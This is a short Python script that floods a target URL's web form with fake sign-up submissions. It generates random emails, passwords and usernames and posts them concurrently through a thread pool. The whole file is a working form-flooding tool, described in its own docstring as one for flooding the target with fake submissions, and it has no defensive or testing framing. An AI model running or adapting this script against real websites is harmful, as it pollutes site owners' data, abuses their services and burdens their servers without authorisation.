import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor
import time

def generate_random_string(length=8):
    """Generate a random string of lowercase letters."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def generate_random_email():
    """Generate a random email address."""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", ]
    username = generate_random_string(random.randint(5, 10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_random_password(length=12):
    """Generate a random password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def submit_form(target_url, form_data):
    """Submit a form to the target URL."""
    try:
        response = requests.post(target_url, data=form_data, timeout=5)
        print(f"Submitted form with email: {form_data.get('email', 'N/A')}, status code: {response.status_code}")
    except Exception as e:
        print(f"Error submitting form: {e}")

def flood_forms(target_url, num_requests=100, max_threads=10):
    """Flood the target URL with fake form submissions."""
    form_fields = {
        "email": generate_random_email,
        "password": generate_random_password,
        "username": generate_random_string,
        # Add other form fields as needed
    }

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for _ in range(num_requests):
            form_data = {field: generator() for field, generator in form_fields.items()}
            executor.submit(submit_form, target_url, form_data)
            time.sleep(0.1)  # Small delay to avoid overwhelming the server too quickly

